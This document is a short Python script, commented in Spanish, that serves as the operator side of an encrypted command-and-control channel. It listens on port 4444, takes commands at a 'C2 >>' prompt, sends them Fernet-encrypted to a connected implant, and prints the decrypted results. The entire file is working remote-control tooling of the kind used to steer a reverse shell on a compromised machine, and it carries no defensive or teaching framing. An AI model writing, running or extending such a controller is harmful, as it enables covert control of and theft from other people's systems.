import socket
from cryptography.fernet import Fernet

# Cargar clave
with open("clave.key", "rb") as f:
    clave = f.read()

fernet = Fernet(clave)

HOST = "0.0.0.0"
PUERTO = 4444

sock = socket.socket()
sock.bind((HOST, PUERTO))
sock.listen(1)
print(f"🛰️ Esperando conexiones en {HOST}:{PUERTO}...")

conn, addr = sock.accept()
print(f"💻 Conexión establecida desde {addr[0]}:{addr[1]}")

while True:
    try:
        comando = input("C2 >> ")

        if comando.lower() == "salir":
            conn.send(fernet.encrypt(b"salir"))
            break

        conn.send(fernet.encrypt(comando.encode()))
        datos_cifrados = conn.recv(4096)
        datos = fernet.decrypt(datos_cifrados).decode()
        print(datos)
    except Exception as e:
        print(f"💥 Error: {e}")
        break

conn.close()
sock.close()

